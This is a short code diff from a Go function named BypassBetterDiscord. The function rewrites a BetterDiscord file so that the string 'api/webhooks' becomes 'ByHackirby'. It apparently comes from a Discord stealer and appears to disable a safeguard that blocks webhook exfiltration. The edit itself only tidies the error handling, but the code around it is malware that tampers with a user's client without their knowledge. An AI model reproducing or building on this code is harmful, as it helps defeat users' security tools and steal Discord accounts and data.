@@ -98,12 +98,10 @@ func BypassBetterDiscord(user string) error {
 	encoder := charmap.CodePage437.NewEncoder()
 	encodedWriter := encoder.Writer(w)
 
-	_, err = encodedWriter.Write(bytes.ReplaceAll(txt, []byte("api/webhooks"), []byte("ByHackirby")))
-	if err != nil {
+	if _, err = encodedWriter.Write(bytes.ReplaceAll(txt, []byte("api/webhooks"), []byte("ByHackirby"))); err != nil {
 		return err
 	}
-	err = w.Flush()
-	if err != nil {
+	if err = w.Flush(); err != nil {
 		return err
 	}
 
